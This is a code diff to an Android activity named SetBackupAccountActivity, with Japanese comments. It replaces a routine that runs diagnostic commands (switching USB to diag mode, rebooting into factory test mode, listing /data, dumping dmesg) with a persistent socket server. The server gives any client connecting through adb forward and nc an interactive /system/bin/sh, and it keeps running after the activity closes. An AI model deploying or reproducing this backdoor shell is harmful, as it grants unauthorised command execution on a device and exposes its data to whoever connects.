@@ -4,91 +4,135 @@ import android.app.Activity;
 import android.os.Bundle;
 import android.util.Log;
 
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.LocalServerSocket;
+import java.net.LocalSocket;
 
 public class SetBackupAccountActivity extends Activity {
-    private static final String TAG = "SetBackupAccount";
+    private static final String TAG = "ShellSocket";
+    private static final String SOCKET_NAME = "android_shell_socket";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // すべてのコマンドを実行
-        executeCommands();
+        // バックグラウンドでソケットサーバーを起動
+        startShellServer();
 
-        // アクティビティを終了
+        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
         finish();
     }
 
-    private void executeCommands() {
-        // 実行するコマンド一覧（すべて sh -c 経由で実行）
-        String[] commands = {
-                "test_diag",
-                "svc setFunction diag",
-                "id",
-                "cat /proc/self/status",
-                "reboot ffbm-02",
-                "ls /data"
-        };
+    private void startShellServer() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    // Unixドメインソケット（抽象名前空間）を開く
+                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
+                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
+                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
+                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");
 
-        for (String cmd : commands) {
-            Log.i(TAG, "========================================");
-            Log.i(TAG, "Executing command: " + cmd);
-            Log.i(TAG, "========================================");
+                    while (true) {
+                        try {
+                            LocalSocket client = server.accept();
+                            Log.i(TAG, "New client connected!");
+                            // クライアントごとに新しいシェルスレッドを起動
+                            new Thread(new ShellHandler(client)).start();
+                        } catch (Exception e) {
+                            Log.e(TAG, "Accept error", e);
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Failed to start socket server", e);
+                }
+            }
+        }).start();
+    }
 
+    // クライアント接続ごとにシェルを提供するハンドラ
+    private static class ShellHandler implements Runnable {
+        private LocalSocket socket;
+
+        ShellHandler(LocalSocket socket) {
+            this.socket = socket;
+        }
+
+        @Override
+        public void run() {
+            Process shell = null;
             try {
-                // シェル経由でコマンドを実行
-                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+                // インタラクティブシェルを起動
+                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
+                builder.redirectErrorStream(true); // stderrをstdoutに統合
+                shell = builder.start();
 
-                // 標準出力を読み取る
-                BufferedReader stdReader = new BufferedReader(
-                        new InputStreamReader(process.getInputStream()));
-                String line;
-                while ((line = stdReader.readLine()) != null) {
-                    Log.i(TAG, "[STDOUT] " + line);
-                }
+                // ソケットの入出力ストリームを取得
+                final InputStream socketIn = socket.getInputStream();
+                final OutputStream socketOut = socket.getOutputStream();
 
-                // 標準エラーを読み取る
-                BufferedReader errReader = new BufferedReader(
-                        new InputStreamReader(process.getErrorStream()));
-                while ((line = errReader.readLine()) != null) {
-                    Log.e(TAG, "[STDERR] " + line);
-                }
+                // シェルの入出力ストリームを取得
+                final OutputStream shellStdin = shell.getOutputStream();
+                final InputStream shellStdout = shell.getInputStream();
 
-                // 終了コードを待つ
-                int exitCode = process.waitFor();
-                Log.i(TAG, "Command '" + cmd + "' exited with code: " + exitCode);
+                // スレッド1: ソケット → シェル (ユーザー入力 → シェルstdin)
+                Thread socketToShell = new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            byte[] buffer = new byte[1024];
+                            int len;
+                            while ((len = socketIn.read(buffer)) != -1) {
+                                shellStdin.write(buffer, 0, len);
+                                shellStdin.flush();
+                            }
+                        } catch (Exception e) {
+                            // 切断時は正常終了
+                        }
+                    }
+                });
+
+                // スレッド2: シェル → ソケット (シェルstdout → クライアント)
+                Thread shellToSocket = new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            byte[] buffer = new byte[1024];
+                            int len;
+                            while ((len = shellStdout.read(buffer)) != -1) {
+                                socketOut.write(buffer, 0, len);
+                                socketOut.flush();
+                            }
+                        } catch (Exception e) {
+                            // 切断時は正常終了
+                        }
+                    }
+                });
+
+                socketToShell.start();
+                shellToSocket.start();
+
+                // シェルプロセスが終了するのを待つ（またはソケット切断）
+                shell.waitFor();
+                Log.i(TAG, "Shell process exited");
+
+                // 後始末
+                socket.close();
+                socketToShell.interrupt();
+                shellToSocket.interrupt();
 
             } catch (Exception e) {
-                Log.e(TAG, "Exception while executing command: " + cmd, e);
+                Log.e(TAG, "Shell handler error", e);
+            } finally {
+                if (shell != null) {
+                    shell.destroy();
+                }
+                try {
+                    socket.close();
+                } catch (Exception ignored) {}
             }
         }
-
-        // 追加: dmesg の出力をログに出力（最初の200行程度）
-        Log.i(TAG, "========================================");
-        Log.i(TAG, "Capturing dmesg output");
-        Log.i(TAG, "========================================");
-        try {
-            Process dmesgProcess = Runtime.getRuntime().exec(new String[]{"dmesg"});
-            BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(dmesgProcess.getInputStream()));
-            String line;
-            int lineCount = 0;
-            while ((line = reader.readLine()) != null && lineCount < 200) {
-                Log.i(TAG, "[DMESG] " + line);
-                lineCount++;
-            }
-            if (lineCount == 200) {
-                Log.i(TAG, "[DMESG] ... (truncated, too many lines)");
-            }
-            dmesgProcess.waitFor();
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to capture dmesg", e);
-        }
-
-        Log.i(TAG, "========================================");
-        Log.i(TAG, "All commands executed. Finishing activity.");
-        Log.i(TAG, "========================================");
     }
 }
